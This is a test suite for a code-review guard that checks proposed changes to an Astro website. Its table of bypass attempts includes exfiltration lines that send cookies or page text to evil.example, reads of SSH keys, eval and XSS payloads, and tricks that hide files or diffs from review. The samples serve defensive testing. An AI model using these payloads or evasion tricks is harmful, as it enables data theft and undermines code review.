import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { describe, test } from 'node:test';

const {
	pathProblem,
	importProblem,
	reviewAdded,
	parseDiff,
	leakedSecrets,
	imageProblem,
	codeRegions,
	reviewWorkingTree,
	LIMITS,
} = await import('../scripts/pipeline/guards.ts');

const review = (file, text) => reviewAdded(new Map([[file, text]]), () => text);

// Ways around the checks: from the original corpus, ported to our paths, plus new ones.
const ATTACKS = {
	'fs without node:': `import { readFileSync } from 'fs';\nreadFileSync('/root/.ssh/id_ed25519')`,
	'?raw of .env': `import raw from '../../.env?raw';`,
	'import.meta.glob': `---\nconst all = import.meta.glob('/**/*', { query: '?raw' });\n---`,
	'process split up': `---\nconst e = globalThis['pro' + 'cess']['e' + 'nv'];\n---`,
	'destructured process': `---\nconst { env } = process;\n---`,
	'function constructor': `<script>(() => {}).constructor('return this')();</script>`,
	'computed dynamic import': `<script>const m = await import('child_' + 'process');</script>`,
	createRequire: `import { createRequire } from 'module';`,
	'INSERT OR REPLACE': `---\nall("INSERT OR REPLACE INTO users VALUES (1)")\n---`,
	'UPDATE with quotes': `---\nrun('UPDATE "users" SET handle = 1')\n---`,
	'SQL split with +': `---\nall('DROP' + ' TABLE x')\n---`,
	'navigating out with data': `<script>location.href = 'https://evil.example/?c=' + document.body.innerText;</script>`,
	'eval split across lines': `<script>eval\n(code)</script>`,
	'window.open': `<script>window.open(url + data)</script>`,
	sessions: `---\nall('SELECT value FROM sessions')\n---`,
	'computed table name': `---\nall('SELECT * FROM ' + table)\n---`,
	prerender: `---\nexport const prerender = true;\n---`,
	'importing the env module': `import { getSiteUrl } from '../core/env';`,
	'importing the db client': `import { all } from '../core/db/client';`,
	'importing auth': `import { getSessionUser } from '../core/auth/session';`,
	'importing the API': `import { POST } from './api/votes';`,
	'any package': `import x from 'left-pad';`,
	'astro:actions': `import { actions } from 'astro:actions';`,
	sendBeacon: `<script>navigator.sendBeacon('/x', data)</script>`,
	Reflect: `<script>Reflect.get(obj, key)</script>`,
	'external script': `<script src="https://cdn.example/x.js"></script>`,
	'protocol-relative script': `<script src="//cdn.example/x.js"></script>`,
	'external iframe': `<iframe src="https://youtube.com/embed/x"></iframe>`,
	'external fetch': `<script>fetch('https://evil.example/log?' + document.cookie)</script>`,
	'document.cookie': `<script>const c = document.cookie;</script>`,
	'server fetch to a variable': `---\nconst r = await fetch(target);\n---`,
	'expression reading the env': `<p>{globalThis.process?.env?.SECRET}</p>`,
	'expression with process': `<p>{process.env.DATABASE_URL}</p>`,
	'meta refresh': `<meta http-equiv="refresh" content="0;url=https://evil.example">`,
	'css import from outside': `<style>@import url("https://evil.example/x.css");</style>`,
	'css url to outside': `<style>body { background: url(//evil.example/p.png) }</style>`,
	'timer with code string': `<script>setTimeout("alert(1)", 10)</script>`,
	'absolute import': `import Shell from '/src/core/components/Shell.astro?raw';`,
	'node: module': `---\nimport { readFileSync } from 'node:fs';\n---`,
	'session write': `---\nAstro.session.set('user', { id: 1 });\n---`,
	'secret function': `---\nconst x = getProviderConfig('github');\n---`,
	// Visitors' text from the store turned into markup.
	'innerHTML with visitor text': '<script>row.innerHTML = `<td>${item.data.message}</td>`;</script>',
	'innerHTML appended': `<script>list.innerHTML += '<li>' + text + '</li>';</script>`,
	'innerHTML via Object.assign': `<script>Object.assign(el, { innerHTML: text });</script>`,
	'innerHTML by computed name': `<script>el['innerHTML'] = text;</script>`,
	outerHTML: `<script>el.outerHTML = text;</script>`,
	insertAdjacentHTML: `<script>el.insertAdjacentHTML('beforeend', text);</script>`,
	'document.write': `<script>document.write(text);</script>`,
	DOMParser: `<script>const doc = new DOMParser().parseFromString(text, 'text/html');</script>`,
	'set:html': `---\nconst list = [];\n---\n<div set:html={list.map((i) => i.data.message).join('')} />`,
};

describe('attacks are refused', () => {
	for (const [name, code] of Object.entries(ATTACKS)) {
		test(name, () => {
			const file = name.includes('API') ? 'src/pages/thing.astro' : 'src/components/X.astro';
			assert.notDeepEqual(review(file, code), [], `passed: ${code}`);
		});
	}

	test('a module that calls out from src/lib is refused', () => {
		assert.notDeepEqual(review('src/lib/x.ts', `export const f = (u) => fetch(u);`), []);
	});
});

describe('normal work passes', () => {
	test('a new page using the shell, core components and icons', () => {
		const page = [
			'---',
			`import Shell from '../core/components/Shell.astro';`,
			`import Icon from '../core/components/Icon.astro';`,
			`import { timeAgo } from '../core/format';`,
			`import { icons } from '@iconify-json/tabler';`,
			`import Card from '../components/Card.astro';`,
			`const items = [{ title: 'Hello', at: new Date().toISOString() }];`,
			'---',
			'<Shell title="Garden">',
			'  <main class="wrap">',
			'    <h1>A little garden</h1>',
			'    <p>Our process is simple: update the board, set a goal, delete nothing.</p>',
			'    {items.map((item) => <Card title={item.title} when={timeAgo(item.at)} />)}',
			'  </main>',
			'</Shell>',
			'<script>',
			`  const button = document.querySelector('button');`,
			`  button?.addEventListener('click', async () => {`,
			`    const res = await fetch('/api/votes');`,
			`    if (res.ok) location.href = '/ideas';`,
			`  });`,
			'</script>',
		].join('\n');
		assert.deepEqual(review('src/pages/garden.astro', page), []);
	});

	test('clearing an element and reading innerHTML are fine', () => {
		const code = `<script>\nlist.innerHTML = '';\nbox.innerHTML = ""\nif (el.innerHTML === '') show();\nconst copy = el.innerHTML;\n</script>`;
		assert.deepEqual(review('src/components/List.astro', code), []);
	});

	test('mentioning eval in a comment is fine', () => {
		assert.deepEqual(review('src/lib/x.ts', `// no eval or new Function here`), []);
	});

	test('a client-side fetch to a blob is fine', () => {
		const client = `---\nconst t = 1;\n---\n<script>const b = await (await fetch(url)).blob();</script>`;
		assert.deepEqual(review('src/components/A.astro', client), []);
	});

	test('our own home page passes as it is', () => {
		const home = readFileSync(new URL('../src/pages/index.astro', import.meta.url), 'utf8');
		assert.deepEqual(review('src/pages/index.astro', home), []);
	});

	test('a plain SVG drawing passes', () => {
		assert.deepEqual(review('public/sun.svg', '<svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/></svg>'), []);
	});
});

describe('paths', () => {
	const refused = [
		'package.json',
		'astro.config.mjs',
		'scripts/pipeline/guards.ts',
		'src/core/votes/queries.ts',
		'src/core/components/Shell.astro',
		'src/pages/api/votes.ts',
		'src/pages/api/new.ts',
		'src/middleware.ts',
		'src/env.d.ts',
		'src/pages/ideas.astro',
		'src/pages/build.astro',
		'src/pages/signin.astro',
		'src/pages/ideas/[id].astro',
		'src/pages/status.ts',
		'src/pages/feed.xml.js',
		'src/pages/notes.md',
		'src/.gitignore',
		'src/lib/.hidden/a.ts',
		'.gitattributes',
		'public/.htaccess',
		'public/favicon.svg',
		'public/core/x.png',
		'public/ideas.html',
		'public/app.js',
		'public/index.html',
		'src/pages/../core/x.ts',
		'src\\core\\x.ts',
		'src/content.config.ts',
		'src/lib/x.mdx',
		'src/collections/notes.ts',
		'src/collections/Notes.json',
		'src/collections/sub/notes.json',
		'src/collections/n.json',
	];
	const allowed = [
		'src/pages/index.astro',
		'src/pages/garden.astro',
		'src/components/Card.astro',
		'src/lib/moon.ts',
		'src/styles/garden.css',
		'public/sun.svg',
		'public/img/a.png',
		'src/collections/guestbook.json',
		'src/collections/pixel-wall.json',
	];

	for (const path of refused) test(`refuses ${path}`, () => assert.notEqual(pathProblem(path), null));
	for (const path of allowed) test(`allows ${path}`, () => assert.equal(pathProblem(path), null));
});

describe('imports', () => {
	test('relative imports stay inside src/ and out of the core', () => {
		assert.match(importProblem('src/components/A.astro', '../../package.json'), /outside src/);
		assert.match(importProblem('src/components/A.astro', '../core/db/client'), /core module/);
		assert.equal(importProblem('src/components/A.astro', '../lib/moon'), null);
		assert.equal(importProblem('src/pages/a.astro', '../core/components/Shell.astro'), null);
		assert.equal(importProblem('src/pages/a.astro', '../core/format'), null);
		assert.equal(importProblem('src/pages/a.astro', '../core/public/ideas'), null);
		assert.equal(importProblem('src/pages/a.astro', '../core/public/store'), null);
		assert.match(importProblem('src/pages/a.astro', '../core/store/queries'), /core module/);
	});
});

describe('the diff parser', () => {
	test('an added line starting with "++ " is content, not a new file header', () => {
		const diff = [
			'diff --git a/src/pages/a.astro b/src/pages/a.astro',
			'--- a/src/pages/a.astro',
			'+++ b/src/pages/a.astro',
			'@@ -1,1 +1,3 @@',
			' <p>hi</p>',
			'+++ b/src/pages/innocent.astro',
			'+<script>eval(x)</script>',
		].join('\n');
		const files = parseDiff(diff);
		assert.deepEqual([...files.keys()], ['src/pages/a.astro']);
		assert.match(files.get('src/pages/a.astro'), /eval/);
	});

	test('deleted files have no added text', () => {
		const diff = ['diff --git a/x b/x', '--- a/x', '+++ /dev/null', '@@ -1 +0,0 @@', '-gone'].join('\n');
		assert.equal(parseDiff(diff).size, 0);
	});
});

describe('secrets and images', () => {
	test('known key formats and configured values are caught', () => {
		const files = new Map([
			['src/a.ts', 'const k = "sk-ant-abcdefghijklmnopqrstuv";'],
			['src/b.ts', 'const t = "ghp_abcdefghijklmnopqrstuvwxyz0123";'],
			['src/c.astro', '<p>my-very-own-configured-secret-value</p>'],
		]);
		assert.equal(leakedSecrets(files, ['my-very-own-configured-secret-value']).length, 3);
	});

	test('images must be real and small', () => {
		const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0]);
		assert.equal(imageProblem('public/a.png', png), null);
		assert.match(imageProblem('public/a.png', Buffer.from('<script>alert(1)</script>')), /not a real image/);
		assert.match(imageProblem('public/b.png', Buffer.alloc(LIMITS.maxImageBytes + 1)), /over/);
	});

	test('SVG with script, handlers or external references is refused', () => {
		for (const svg of [
			'<svg><script>alert(1)</script></svg>',
			'<svg onload="alert(1)"></svg>',
			'<svg><foreignObject><div/></foreignObject></svg>',
			'<svg><a href="javascript:alert(1)"/></svg>',
			'<svg><image href="https://evil.example/x.png"/></svg>',
		]) {
			assert.notDeepEqual(review('public/x.svg', svg), [], svg);
		}
	});
});

describe('code regions', () => {
	test('frontmatter, scripts and expressions are code; prose is not', () => {
		const page = '---\nconst a = 1;\n---\n<p>process words</p>\n{a + 1}\n<script>let b = 2;</script>\n<style>p { color: red }</style>';
		const code = codeRegions('src/pages/x.astro', page);
		assert.match(code, /const a = 1/);
		assert.match(code, /a \+ 1/);
		assert.match(code, /let b = 2/);
		assert.doesNotMatch(code, /process words/);
		assert.doesNotMatch(code, /color: red/);
	});
});

// ---- A real git working tree ----

function makeRepo() {
	const dir = mkdtempSync(join(tmpdir(), 'pw-guards-'));
	const run = (...args) => execFileSync('git', args, { cwd: dir, stdio: 'ignore' });
	run('init', '-q', '-b', 'main');
	run('config', 'user.email', 'test@example.com');
	run('config', 'user.name', 'test');
	run('config', 'core.autocrlf', 'false');
	const write = (path, text) => {
		mkdirSync(dirname(join(dir, path)), { recursive: true });
		writeFileSync(join(dir, path), text);
	};
	write('src/core/votes.ts', 'export const MAX = 3;\n');
	write('src/pages/index.astro', '---\nconst a = 1;\n---\n<p>home</p>\n');
	write('.gitignore', 'secret-notes/\n');
	run('add', '-A');
	run('commit', '-q', '-m', 'init');
	return { dir, write, run };
}

describe('reviewing a working tree', () => {
	test('a clean, allowed change passes', () => {
		const { dir, write } = makeRepo();
		write('src/pages/garden.astro', '---\nconst x = 1;\n---\n<p>garden</p>\n');
		write('src/pages/index.astro', '---\nconst a = 1;\n---\n<p>home, now with a garden link</p>\n');
		const result = reviewWorkingTree(dir);
		assert.deepEqual(result.problems, []);
		assert.equal(result.ok, true);
		assert.deepEqual(result.files.sort(), ['src/pages/garden.astro', 'src/pages/index.astro']);
	});

	test('editing the core is refused', () => {
		const { dir, write } = makeRepo();
		write('src/core/votes.ts', 'export const MAX = 300;\n');
		assert.ok(reviewWorkingTree(dir).problems.some((p) => p.startsWith('core file')));
	});

	test('a valid collection declaration and the store helper pass', () => {
		const { dir, write } = makeRepo();
		write(
			'src/collections/guestbook.json',
			JSON.stringify({ name: 'guestbook', mode: 'append', fields: { message: { type: 'text', max: 140 } }, perUserPerDay: 5 }),
		);
		write(
			'src/pages/guestbook.astro',
			`---\nimport Shell from '../core/components/Shell.astro';\nimport { storeItems } from '../core/public/data';\nconst list = storeItems('guestbook', 20);\n---\n<Shell title="Guestbook"><p>{list.total}</p></Shell>\n<script>\nimport { collection } from '../core/public/store';\ncollection('guestbook').watch((l) => console.log(l.total));\n</script>\n`,
		);
		assert.deepEqual(reviewWorkingTree(dir).problems, []);
	});

	test('a collection the core would ignore is refused, with the reasons', () => {
		const { dir, write } = makeRepo();
		write('src/collections/guestbook.json', JSON.stringify({ name: 'book', mode: 'append', fields: { m: { type: 'html' } }, perHour: 9 }));
		write('src/collections/broken.json', '{ "name": ');
		const problems = reviewWorkingTree(dir).problems.join('\n');
		assert.match(problems, /guestbook\.json: "name" is "book"/);
		assert.match(problems, /unknown setting "perHour"/);
		assert.match(problems, /field "m": "type" must be/);
		assert.match(problems, /broken\.json is not valid JSON/);
	});

	test('a secret in a brand-new file is caught', () => {
		const { dir, write } = makeRepo();
		write('src/lib/keys.ts', 'export const k = "sk-ant-abcdefghijklmnopqrstuvwx";\n');
		assert.ok(reviewWorkingTree(dir).problems.some((p) => p.includes('Anthropic key')));
	});

	test('a new .gitignore and the file it hides are both refused', () => {
		const { dir, write } = makeRepo();
		write('src/.gitignore', 'hidden.ts\n');
		write('src/hidden.ts', 'export const x = process.env;\n');
		const problems = reviewWorkingTree(dir).problems;
		assert.ok(problems.some((p) => p.startsWith('hidden file')));
		assert.ok(problems.some((p) => p.includes('ignore rule')), problems.join('; '));
	});

	test('a file under an existing ignore rule inside src/ is refused', () => {
		const { dir, write } = makeRepo();
		write('src/secret-notes/x.ts', 'export const y = 1;\n');
		assert.ok(reviewWorkingTree(dir).problems.some((p) => p.includes('ignore rule')));
	});

	test('a .gitattributes trying to hide diffs is refused', () => {
		const { dir, write } = makeRepo();
		write('.gitattributes', '*.astro -diff\n');
		write('src/pages/x.astro', '<script>eval(atob("x"))</script>\n');
		const problems = reviewWorkingTree(dir).problems;
		assert.ok(problems.some((p) => p.includes('.gitattributes')));
		assert.ok(problems.some((p) => p.includes('eval')), problems.join('; '));
	});

	test('moving a core file somewhere allowed counts as touching the core', () => {
		const { dir, run } = makeRepo();
		mkdirSync(join(dir, 'src/lib'), { recursive: true });
		run('mv', 'src/core/votes.ts', 'src/lib/votes.ts');
		assert.ok(reviewWorkingTree(dir).problems.some((p) => p.includes('src/core/votes.ts')));
	});

	test('a change over the size limit is refused', () => {
		const { dir, write } = makeRepo();
		write('src/lib/big.ts', Array.from({ length: LIMITS.maxChangedLines + 50 }, (_, i) => `export const v${i} = ${i};`).join('\n'));
		assert.ok(reviewWorkingTree(dir).problems.some((p) => p.includes('too large')));
	});

	test('a symbolic link is refused', (t) => {
		const { dir } = makeRepo();
		try {
			symlinkSync(join(dir, 'src/core/votes.ts'), join(dir, 'src/pages/link.astro'));
		} catch {
			t.skip('this machine does not allow creating symlinks');
			return;
		}
		assert.ok(reviewWorkingTree(dir).problems.some((p) => p.includes('symbolic link')));
	});

	test('a broken repository fails closed', () => {
		const result = reviewWorkingTree(join(tmpdir(), 'pw-does-not-exist-' + process.pid));
		assert.equal(result.ok, false);
		assert.match(result.problems[0], /review itself failed/);
	});
});
